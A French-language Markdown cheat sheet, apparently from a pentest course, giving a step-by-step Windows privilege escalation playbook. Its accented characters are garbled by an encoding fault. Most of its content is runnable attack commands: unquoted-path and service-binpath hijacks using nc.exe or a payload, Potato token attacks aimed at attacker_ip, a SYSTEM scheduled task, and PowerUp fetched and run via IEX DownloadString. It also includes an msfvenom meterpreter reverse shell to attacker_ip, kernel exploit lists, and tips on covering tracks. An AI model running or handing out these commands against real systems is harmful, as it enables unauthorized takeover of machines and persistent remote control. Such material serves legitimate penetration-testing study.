# Windows Privilege Escalation - Guide Complet

## üóÇÔ∏è Workflow d'escalade de privil√®ges Windows
1. √ânum√©ration utilisateur et syst√®me (whoami, systeminfo, tasklist)
   ‚Üì
2. Recherche de services vuln√©rables et mauvaises configurations
   ‚Üì
3. V√©rification des privil√®ges et tokens (SeImpersonate, SeDebug)
   ‚Üì
4. Analyse des t√¢ches planifi√©es et autostart (schtasks, autoruns)
   ‚Üì
5. Exploitation kernel ou applications (MS17-010, CVE r√©cents)
   ‚Üì
6. √âl√©vation vers SYSTEM et persistance

## üìã Vue d'ensemble

L'escalade de privil√®ges Windows vise √† passer d'un utilisateur standard √† SYSTEM ou Administrateur en exploitant des mauvaises configurations, services vuln√©rables ou failles syst√®me.

> **üí° Explication Simple** : C'est comme passer d'employ√© √† directeur g√©n√©ral en trouvant des failles dans l'organisation Windows ou des services mal configur√©s qui donnent trop de droits.

## üîç √ânum√©ration Initiale

### Informations utilisateur et privil√®ges
```batch
# Informations utilisateur
whoami
whoami /priv
whoami /groups
whoami /all

# Informations syst√®me
systeminfo
hostname
echo %USERNAME%
echo %COMPUTERNAME%
net user %USERNAME%
```

### √ânum√©ration des privil√®ges critiques
```batch
# Privil√®ges dangereux √† rechercher
# SeImpersonatePrivilege (Potato attacks)
# SeAssignPrimaryTokenPrivilege 
# SeDebugPrivilege (acc√®s processus)
# SeRestorePrivilege (modification fichiers)
# SeTakeOwnershipPrivilege (prise ownership)
# SeLoadDriverPrivilege (chargement drivers)

whoami /priv | findstr "SeImpersonate\|SeAssignPrimaryToken\|SeDebug\|SeRestore\|SeTakeOwnership\|SeLoadDriver"
```

### Services et processus
```batch
# Services en cours
sc query type=service state=all
net start
tasklist /svc

# Processus d√©taill√©s
wmic process get name,processid,parentprocessid,executablepath
tasklist /v

# Services avec chemins
wmic service get name,displayname,pathname,startmode
```

## ‚öôÔ∏è Services Vuln√©rables

### Services avec chemins non-quot√©s
```batch
# Recherche de chemins non-quot√©s
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# V√©rification manuelle
for /f "tokens=2" %%A in ('sc query type^= service state^= all^| findstr SERVICE_NAME') do (
    for /f "tokens=3*" %%B in ('sc qc %%A ^| findstr BINARY_PATH_NAME') do (
        echo %%A: %%C %%D
    )
)
```

### Exploitation chemins non-quot√©s
```batch
# Si service avec chemin: C:\Program Files\Service\service.exe
# Cr√©er payload dans:
# C:\Program.exe
# C:\Program Files\Service.exe

# Exemple avec nc.exe renomm√©
copy nc.exe "C:\Program.exe"
sc stop vulnerable_service
sc start vulnerable_service
```

### Services avec permissions faibles
```batch
# V√©rifier permissions services avec accesschk
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *
accesschk.exe -uwcqv %USERNAME% *

# Services modifiables
accesschk.exe -uwcqv "Everyone" *
```

### Exploitation permissions services
```batch
# Modifier le binpath d'un service
sc config vulnerable_service binpath= "C:\path\to\payload.exe"
sc stop vulnerable_service
sc start vulnerable_service

# Ou avec reg
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnService" /v ImagePath /t REG_EXPAND_SZ /d "C:\payload.exe" /f
```

## üçØ Token Impersonation (Potato Attacks)

### D√©tection des privil√®ges requis
```batch
# V√©rifier SeImpersonatePrivilege ou SeAssignPrimaryTokenPrivilege
whoami /priv | findstr "SeImpersonate\|SeAssignPrimaryToken"
```

### Juicy Potato (Windows Server 2016 et ant√©rieurs)
```batch
# T√©l√©charger JuicyPotato.exe
# Usage basique
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}

# Avec payload personnalis√©
JuicyPotato.exe -l 1337 -p payload.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
```

### Rogue Potato (Windows 10/Server 2019+)
```batch
# M√©thode plus r√©cente pour nouvelles versions
RoguePotato.exe -r attacker_ip -e "C:\Windows\System32\cmd.exe" -l 9999
```

### Generic Potato
```powershell
# Alternative PowerShell
Import-Module .\GenericPotato.ps1
Invoke-GenericPotato -Command "C:\Windows\System32\cmd.exe"
```

## üìÖ T√¢ches Planifi√©es

### √ânum√©ration t√¢ches planifi√©es
```batch
# Toutes les t√¢ches
schtasks /query /fo LIST /v

# T√¢ches avec permissions faibles
accesschk.exe -dqv "C:\Windows\Tasks"
accesschk.exe -dqv "C:\Windows\System32\Tasks"

# Recherche de t√¢ches modifiables
dir C:\Windows\System32\Tasks /s
icacls C:\Windows\System32\Tasks\*
```

### Exploitation t√¢ches planifi√©es
```batch
# Si t√¢che ex√©cute script modifiable
echo "payload" > C:\path\to\vulnerable\script.bat

# Cr√©er nouvelle t√¢che (si permissions)
schtasks /create /sc minute /mo 1 /tn "MyTask" /tr "C:\payload.exe" /ru SYSTEM
```

## üîß Outils d'Automatisation

### WinPEAS
```batch
# T√©l√©chargement et ex√©cution
powershell -c "iwr -uri 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe' -outfile 'winPEAS.exe'"
winPEAS.exe

# Mode quiet (moins verbeux)
winPEAS.exe quiet

# Checks sp√©cifiques
winPEAS.exe systeminfo userinfo
```

### PowerUp (PowerSploit)
```powershell
# Import et ex√©cution
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')

# Scan complet
Invoke-AllChecks

# Checks sp√©cifiques
Get-UnquotedService
Get-ModifiableServiceFile
Get-ModifiableService
Get-ServiceUnquoted
```

### Windows Exploit Suggester
```batch
# C√¥t√© attaquant avec systeminfo.txt
python windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo systeminfo.txt
```

### AccessChk (Sysinternals)
```batch
# T√©l√©charger accesschk.exe
# Permissions services
accesschk.exe -uwcqv "Authenticated Users" *

# Permissions fichiers
accesschk.exe -w C:\Windows\System32\config

# Permissions registre
accesschk.exe -k HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

## üêõ Exploits Kernel Windows

### Identification version Windows
```batch
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic os get Caption,Version,BuildNumber,OSArchitecture
```

### Exploits courants par version
```batch
# Windows 7/Server 2008
# MS10-015 (KiTrap0D)
# MS10-092 (Task Scheduler)
# MS11-080 (AFD.sys)

# Windows 8/Server 2012
# MS13-005 (Kernel-Mode Driver)
# MS13-081 (TrackPopupMenuEx)

# Windows 10/Server 2016+
# CVE-2019-1388 (UAC Bypass)
# CVE-2020-0787 (Background Intelligent Transfer Service)
# CVE-2021-1675 (PrintNightmare)
```

### Utilisation d'exploits
```batch
# Exemple avec MS16-032
powershell -ExecutionPolicy Bypass -File MS16-032.ps1

# Avec Metasploit
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > payload.exe
# Puis utiliser exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```

## üõ°Ô∏è Conseils OPSEC
- √âviter les exploits kernel sur syst√®mes de production (risque BSOD)
- Nettoyer les artefacts cr√©√©s (fichiers payload, t√¢ches ajout√©es)
- Utiliser des techniques Living-off-the-Land quand possible
- Documenter tous les privil√®ges et services exploit√©s
- Pr√©f√©rer les techniques non-destructives aux exploits agressifs

## ‚ö†Ô∏è Erreurs fr√©quentes
- Oublier de v√©rifier les privil√®ges tokens (SeImpersonate crucial)
- Ne pas √©num√©rer toutes les t√¢ches planifi√©es (y compris cach√©es)
- Ignorer les services avec chemins non-quot√©s (tr√®s r√©pandu)
- Lancer des exploits sans v√©rifier la version exacte de Windows
- Ne pas v√©rifier les permissions sur les binaires de service

## üí° Astuces
- Utiliser PowerUp et WinPEAS en parall√®le pour maximum de couverture
- Combiner Juicy/Rogue Potato selon la version Windows
- V√©rifier les registres AutoRun pour persistance et privesc
- Chercher les credentials dans les scripts de configuration
- Exploiter les drivers tiers souvent moins s√©curis√©s

## üîó Pour aller plus loin
- [PayloadsAllTheThings - Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Windows%20Privilege%20Escalation)
- [HackTricks - Windows PrivEsc](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation)
- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [LOLBAS](https://lolbas-project.github.io/)

## üß≠ Navigation
- [Guide Linux Privilege Escalation](./Linux_Privilege_Escalation.md)
- [Guide √©num√©ration Windows](../../01-Enumeration/Syst√®mes/Windows_Enumeration.md)
- [Retour √† l'exploitation syst√®me](./README.md) 